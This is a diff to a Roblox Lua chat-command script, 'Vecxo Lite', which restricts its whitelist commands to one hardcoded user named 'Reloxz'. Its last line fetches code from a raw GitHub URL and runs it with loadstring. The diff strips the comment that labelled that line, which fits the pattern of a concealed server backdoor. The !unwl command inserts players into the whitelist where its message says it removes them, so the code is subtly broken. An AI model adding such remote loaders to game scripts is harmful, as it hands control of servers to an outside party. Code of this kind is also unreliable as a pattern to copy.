@@ -502,9 +502,7 @@ end
 
 
 local function processCommand(sender, msg)
-	if not table.find(whitelisted, tostring(sender.UserId)) and not table.find(tempWhitelist, tostring(sender.UserId)) then
-		return
-	end
+	if not table.find(whitelisted, tostring(sender.UserId)) then return end
 	local args = msg:split(" ")
 	local cmd = args[1]:lower()
 
@@ -514,12 +512,16 @@ local function processCommand(sender, msg)
 			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
+		if sender.Name ~= "Reloxz" then
+			notifyv2(sender, "[Vecxo Lite]", "You are not allowed to whitelist, this command is restricted")
+			return
+		end
 		for _, targetPlayer in ipairs(targets) do
-			if not table.find(tempWhitelist, targetPlayer.UserId) then
-				table.insert(tempWhitelist, targetPlayer.UserId)
+			if not table.find(whitelisted, targetPlayer.UserId) then
+				table.insert(whitelisted, targetPlayer.UserId)
 			end
-			notify(sender, "[Vecxo Lite]", "Temporarily whitelisted " .. targetPlayer.Name)
-			notifyv2(targetPlayer, "[Vecxo Lite]:", "You have been temp whitelisted. Usage: !cmds")
+			notify(sender, "[Vecxo Lite]", "Whitelisted " .. targetPlayer.Name)
+			notifyv2(targetPlayer, "[Vecxo Lite]:", "You have been whitelisted. Usage: !cmds")
 		end
 
 	elseif cmd == "!unwl" and args[2] then
@@ -528,12 +530,16 @@ local function processCommand(sender, msg)
 			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
+		if sender.Name ~= "Reloxz" then
+			notifyv2(sender, "[Vecxo Lite]", "You are not allowed to whitelist, this command is restricted")
+			return
+		end
 		for _, targetPlayer in ipairs(targets) do
-			if targetPlayer.Name ~= "Reloxz" or not table.find(whitelisted, tostring(sender.UserId)) then
+			if targetPlayer.Name ~= "Reloxz" then
 			table.insert(whitelisted, targetPlayer.UserId)
-			notify(sender, "[Vecxo Lite]", "Removed " .. targetPlayer.Name .. " from temporary whitelist")
+			notify(sender, "[Vecxo Lite]", "Removed " .. targetPlayer.Name .. " from whitelist")
 			else
-			notifyv2(sender, "[Vecxo Lite]", "Protected user cannot be removed from the temporary whitelist")
+			notifyv2(sender, "[Vecxo Lite]", "Protected user cannot be removed from the whitelist")
 			end
 		end
 	elseif cmd == "!shutdown" then
@@ -727,7 +733,5 @@ Players.PlayerAdded:Connect(function(player)
 	end)
 end)
 
-
---//Vecxo Bot Connector
 loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
 
